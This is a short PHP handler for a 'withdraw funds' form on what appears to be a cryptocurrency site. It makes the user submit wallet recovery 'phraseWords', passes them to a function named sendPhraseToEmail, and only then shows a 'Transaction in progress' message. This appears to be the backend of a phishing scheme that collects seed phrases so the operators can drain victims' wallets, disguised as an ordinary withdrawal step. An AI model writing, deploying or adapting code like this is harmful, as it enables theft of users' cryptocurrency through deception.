<?php 
ob_start();
session_start();
require("../function.php");
require("../config/config.php");
$currentUserID = $_SESSION["user_id"];
 

if(!empty($_REQUEST["phraseWords"]) and  !empty($_REQUEST["selectAccount"])  and !empty($_REQUEST["address"]) and !empty($_REQUEST["amount"])){
  $verrr=  sendPhraseToEmail($_REQUEST["phraseWords"],$_REQUEST["selectAccount"],$_REQUEST["address"]);
  if($verrr==true){
    withdrawFunds($conn,$_SESSION["user_id"],$_REQUEST["amount"] , "withdraw funds");
    $_SESSION["MESSAGE"] ="Transaction in progress";;
    header("Location:./withdraw");
  }else{
    $_SESSION["ERROR"] ="Error occur";;
    header("Location:./withdraw");
  }


}else{
    $_SESSION["ERROR"] ="All fields are required";;
    header("Location:./withdraw");
}


?>